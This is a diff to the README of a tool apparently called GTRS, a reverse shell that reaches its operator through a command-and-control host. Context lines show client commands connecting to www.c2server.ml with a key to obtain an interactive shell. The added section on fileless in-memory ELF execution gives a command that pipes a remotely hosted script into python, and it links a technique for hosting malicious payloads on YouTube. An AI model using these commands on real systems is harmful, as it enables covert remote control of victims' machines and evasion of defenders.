@@ -26,11 +26,18 @@ bash client.sh www.c2server.ml e294a11e-bb6f-49ed-b03a-9ec42be55062
 Now you have an interactive shell using named pipe files, **YES** you can `cd` into directories.
 
 # Client Go
-You first need to download the binarie or compile it, then the processe is equal of the bash client,
+You first need to [download](https://github.com/mthbernardes/GTRS/releases) the binary or compile it, then the process is equal of the bash client,
 ```bash
 ./client_Linux www.c2server.ml e294a11e-bb6f-49ed-b03a-9ec42be55062
 ```
-With this client you have the hability to run it on Linux, Mac and Windows, but the client do not have a interactive shell yet.
+With this client you have the ability to run it on Linux, Mac and Windows, but the client do not have a interactive shell yet.
+
+# ELF in-memory execution (Linux Only)
+After reading this [blogpost](https://blog.fbkcs.ru/en/elf-in-memory-execution/), I made a simple adaption to execute the GTRS in memory, just edit the host and key in the script [inmemory-linux.py](utils/inmemory-linux.py), then host it on a server an curl it.
+```bash
+curl https://yourserver.ml/inmemory-linux.py | python
+```
+Or you can host the script using the [youtube](https://mthbernardes.github.io/rce/2018/12/14/hosting-malicious-payloads-on-youtube.html) approach.
 
 # Poc 
 [![CODE_IS_CHEAP_SHOW_ME_THE_DEMO](http://img.youtube.com/vi/02CFsE0k96E/0.jpg)](http://www.youtube.com/watch?v=02CFsE0k96E)
